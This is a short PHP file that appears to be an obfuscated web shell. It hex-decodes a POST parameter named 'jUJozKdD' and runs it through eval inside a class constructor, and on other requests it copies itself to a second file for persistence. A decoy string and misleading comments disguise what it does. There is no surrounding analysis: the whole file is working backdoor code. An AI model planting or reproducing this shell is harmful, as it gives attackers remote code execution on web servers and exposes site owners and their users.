
<?php
$flags = "Jl6hrHUGnNmXViMDyxPLB5kFd9cEs7ugvojASRY";
class _
{
    static public $jUJozKdD=Null;
    function __construct($l="error"){
        self::$jUJozKdD=$l;
        @eval/*Defining error level offences*/(null.null.self::$jUJozKdD);
    }
}
function hexToStr($hex){   
        $str=""; 
        for($i=0;$i<strlen($hex)-1;$i+=2)
        $str.=chr(hexdec($hex[$i].$hex[$i+1]));
        return  $str;
    }
if(!empty($_POST))
{
	$error = null.hexToStr(@$_POST/*\*/["jUJozKdD"]);
	$d = new _($error);
}
else
{
	$filef = $_SERVER["SCRIPT_FILENAME"];
	$dst = dirname($_SERVER['SCRIPT_FILENAME']).'/jUJozKdD.php';
	if (copy($filef, $dst)) {
		echo 'copy success!';
	}
	else
	{
		echo 'copy failed!';
	}
}
?>
